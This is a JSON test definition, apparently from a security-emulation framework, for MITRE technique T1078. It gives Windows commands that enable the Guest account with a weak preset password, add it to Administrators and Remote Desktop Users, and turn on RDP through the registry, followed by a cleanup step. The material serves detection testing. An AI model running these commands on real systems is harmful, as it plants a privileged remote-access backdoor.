{
  "id": "99747561-ed8d-47f2-9c91-1e5fde1ed6e0",
  "name": "Enable Guest account with RDP capability and admin privileges",
  "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "89056f35-b7f1-49e9-a326-daa4b91693f7",
      "type": "execute-command",
      "data": {
        "command": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "3b7ed5e6-c9f3-4a69-bf2b-5fd742bef24e",
      "type": "execute-command",
      "data": {
        "command": "net user #{guest_user} /active:no \u003enul 2\u003e\u00261\nnet localgroup #{local_admin_group} #{guest_user} /delete \u003enul 2\u003e\u00261\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete \u003enul 2\u003e\u00261\nif #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f \u003enul 2\u003e\u00261)\nif #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f \u003enul 2\u003e\u00261)",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "89056f35-b7f1-49e9-a326-daa4b91693f7",
      "p": "on-success",
      "o": "3b7ed5e6-c9f3-4a69-bf2b-5fd742bef24e"
    },
    {
      "s": "89056f35-b7f1-49e9-a326-daa4b91693f7",
      "p": "on-failure",
      "o": "3b7ed5e6-c9f3-4a69-bf2b-5fd742bef24e"
    }
  ],
  "tags": [
    "T1078",
    "T1078.001"
  ],
  "input_arguments": [
    {
      "name": "local_admin_group",
      "type": "string",
      "description": "Specify the admin localgroup name",
      "value": "Administrators"
    },
    {
      "name": "remote_desktop_users_group_name",
      "type": "string",
      "description": "Specify the remote desktop users group name",
      "value": "Remote Desktop Users"
    },
    {
      "name": "remove_rdp_access_during_cleanup",
      "type": "integer",
      "description": "Set to 1 if you want the cleanup to remove RDP access to machine",
      "value": "0"
    },
    {
      "name": "guest_user",
      "type": "string",
      "description": "Specify the guest account",
      "value": "guest"
    },
    {
      "name": "guest_password",
      "type": "string",
      "description": "Specify the guest password",
      "value": "Password123!"
    }
  ]
}